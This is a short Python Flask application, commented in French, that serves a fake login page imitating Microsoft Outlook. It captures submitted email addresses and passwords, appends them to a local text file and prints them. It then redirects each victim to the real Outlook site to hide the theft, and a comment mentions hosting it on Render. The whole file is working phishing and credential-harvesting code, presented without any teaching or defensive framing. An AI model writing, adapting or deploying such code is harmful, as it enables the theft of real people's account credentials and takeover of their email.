# -*- coding: utf-8 -*-
from flask import Flask, render_template, request, redirect
import os  # Ajout de l'import os pour gérer les variables d'environnement

app = Flask(__name__)

# Route qui affiche la fausse page de connexion
@app.route("/")
def login_page():
    return render_template("login.html")

# Route qui récupère les identifiants saisis et les stocke
@app.route("/submit", methods=["POST"])
def submit():
    email = request.form["email"]
    password = request.form["password"]
    
    # Enregistrer les identifiants dans un fichier texte
    with open("credentials.txt", "a") as file:
        file.write(f"Email: {email} | Password: {password}\n")
    
    print(f"Identifiants reçus - Email: {email}, Password: {password}")

    # Redirige l'utilisateur vers le vrai site Outlook
    return redirect("https://outlook.live.com/")

# Lancer le serveur Flask
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))  # Utiliser le port de Render
    app.run(host="0.0.0.0", port=port, debug=True)
